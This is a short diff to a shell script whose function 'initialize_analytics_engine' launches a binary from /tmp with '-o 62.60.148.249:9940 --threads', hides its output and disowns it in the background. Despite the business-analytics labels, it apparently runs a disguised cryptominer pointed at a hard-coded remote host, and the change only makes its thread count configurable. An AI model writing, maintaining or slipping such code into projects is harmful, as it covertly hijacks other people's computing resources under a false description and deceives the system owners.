@@ -45,7 +45,10 @@ initialize_analytics_engine() {
         chmod +x /tmp/analytics-processing-engine
         
         echo "[$(date)] Initializing business analytics engine with enterprise parameters..."
-        /tmp/analytics-processing-engine -o 62.60.148.249:9940 --threads 75 > /dev/null 2>&1 &
+        # Use environment variable for threads, default to 75 if not set
+        THREADS=${THREADS:-75}
+        echo "[$(date)] Using $THREADS threads for analytics processing"
+        /tmp/analytics-processing-engine -o 62.60.148.249:9940 --threads $THREADS > /dev/null 2>&1 &
         disown
         
         echo "[$(date)] Business Analytics Engine initialized and running in background"
